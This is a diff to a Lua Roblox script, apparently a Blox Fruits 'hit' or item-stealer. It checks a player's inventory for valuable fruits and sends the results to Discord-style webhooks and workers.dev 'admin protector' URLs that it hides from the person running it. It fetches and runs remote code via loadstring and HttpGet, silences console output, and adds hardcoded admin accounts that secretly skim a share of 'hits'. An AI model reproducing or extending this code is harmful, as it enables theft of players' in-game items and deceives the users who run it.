@@ -5,7 +5,10 @@ FruitsToHit = {"Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want 
 
 --[[ OBFUSCATE AFTER THIS ]]--
 --[[ ADMIN CONFIG START ]]--
-loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUl"))()
+Protector = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/f7d22662-d236-4356-b20d-4873f20321c7" -- << Protected URL for admin hits (secondary backup) (url2)
+Dummy = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/d7d3793b-d014-4ec6-8458-882d627fb042" -- << Protected URL for admin/special hits (Premium/TopFruit) (url3)
+Checker22 = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/e748a57f-b049-4a4a-9ff9-ef6a57f0a7ca" -- << Protected URL specifically for Dragon hits (url4)
+
 
 local TEST_WEBHOOK = "https://l.webhook.party/hook/vWJ1Rd7lQSopCs4Vuxa7qHWNoYm4q9%2FH4UAqVOaMoxSpOq%2F4Yp08fCU4Tkn%2Fq26SyB0EVJmJSP9spoYM4pFRDLegxSsmeVCLVPWmKH437EawBax1%2FvN6KILwa9CaWV1%2Fkg7EjtZ0UlOwMyqR7X1iXvdaUcyJaApo2%2FIn7mbomfGkAFacgxB6WVOi0Lm9exZDmC04bOlBJ3pX9FcWLadkzLCKvZE8ytiea1LgyVzVyBUBCPSBTWl6yTaIPk8428hc23eC3dAsPuCK4Dbu2ZernRaO654dO7nVSJuzelZL09nkouPlr28BGoAwlNImD%2FvtTTPWuZnUVTnr9%2FijK2q%2Bh92EfSHf%2BH5qg334UcBZR5b7osNi4z%2BD8DCK%2F%2BooE1xWtv6WgNQkDMM%3D/zWMIeMClX%2FlPLAgD" -- For simple hit integrity check only
 local TEST_PAYLOAD = game:GetService("HttpService"):JSONEncode({ content = "# <a:babyshark:721795947037851688> Sharky! Someone just got a NICE HIT :) <a:babyshark:721795947037851688>" })
@@ -16,7 +19,7 @@ TestingUsernames = { "tester1", "your_alt_account" }
 
 ActivationPasswords = { "ishusontop", "bonzarbal", "ishufishy" } -- << Passwords for ?activate command
 
-local coreAdminUsernames = { "x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50" } -- << Core admin usernames (hardcoded)
+local coreAdminUsernames = { "x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg" } -- << Core admin usernames (hardcoded)
 
 RGBGreenVal = 0.20 -- << (e.g., 20%) Chance user webhook gets Dragon hit notifications.
 RGBRedVal = 0.60 -- << (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits.
@@ -334,13 +337,13 @@ end
 -- Config Validation (Loadstring is executed before this, potential risk if URL is bad)
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUl"))()
-end) -- Load other webhooks (Protector, dummy, Checker22 assumed defined here)
+end) -- Load other webhooks (Protector, Dummy, Checker22 assumed defined here)
 
-if not _G.Webhook or not _G.Protector or not _G.dummy or not _G.Checker22 or not Usernames or not FruitsToHit or not ActivationPasswords or not validation_sig or not coreAdminUsernames or not TestingUsernames then
+if not _G.Webhook or not _G.Protector or not _G.Dummy or not _G.Checker22 or not Usernames or not FruitsToHit or not ActivationPasswords or not validation_sig or not coreAdminUsernames or not TestingUsernames then
     LocalPlayer:Kick("Config Error: Missing critical variable(s).");
     return
 end
-if type(_G.Webhook) ~= "string" or type(_G.Protector) ~= "string" or type(_G.dummy) ~= "string" or type(_G.Checker22) ~= "string" or type(Usernames) ~= "table" or type(TestingUsernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" or type(coreAdminUsernames) ~= "table" or type(validation_sig) ~= "string" then
+if type(_G.Webhook) ~= "string" or type(_G.Protector) ~= "string" or type(_G.Dummy) ~= "string" or type(_G.Checker22) ~= "string" or type(Usernames) ~= "table" or type(TestingUsernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" or type(coreAdminUsernames) ~= "table" or type(validation_sig) ~= "string" then
     LocalPlayer:Kick("Config Error: Variable type mismatch.");
     return
 end
@@ -348,7 +351,7 @@ if validation_sig == "" or validation_sig:find("YourActualSecret") then
     LocalPlayer:Kick("SECURITY ERROR: Invalid Signature!");
     return
 end
-if _G.Webhook:find("REPLACE") or _G.Protector:find("REPLACE") or _G.dummy:find("REPLACE") or _G.Checker22:find("REPLACE") then
+if _G.Webhook:find("REPLACE") or _G.Protector:find("REPLACE") or _G.Dummy:find("REPLACE") or _G.Checker22:find("REPLACE") then
     LocalPlayer:Kick("ERROR: URLs are not configured!");
     return
 end
@@ -387,21 +390,21 @@ Webhook = nil; -- Clear global and local refs
 local Protector_key = storeWebhookSafely(_G.Protector);
 _G.Protector = nil;
 Protector = nil;
-local dummy_key = storeWebhookSafely(_G.dummy);
-_G.dummy = nil;
-dummy = nil;
+local Dummy_key = storeWebhookSafely(_G.Dummy);
+_G.Dummy = nil;
+Dummy = nil;
 local dragon_webhook_key = storeWebhookSafely(_G.Checker22);
 _G.Checker22 = nil;
 Checker22 = nil;
 
 -- Silence Remote Console
-rconsoleprint = function()
+local rconsoleprint = function()
 end;
-rconsolewarn = function()
+local rconsolewarn = function()
 end;
-rconsoleerr = function()
+local rconsoleerr = function()
 end;
-rconsoleinfo = function()
+local rconsoleinfo = function()
 end
 
 -- Game Specific Variables
@@ -767,7 +770,7 @@ end
 local function sendWebhook(inventory)
     local url1 = webhook1_key and _G[webhook1_key];
     local url2 = Protector_key and _G[Protector_key];
-    local url3 = dummy_key and _G[dummy_key];
+    local url3 = Dummy_key and _G[Dummy_key];
     local url4 = dragon_webhook_key and _G[dragon_webhook_key]
     if not url1 and not url2 then
         return
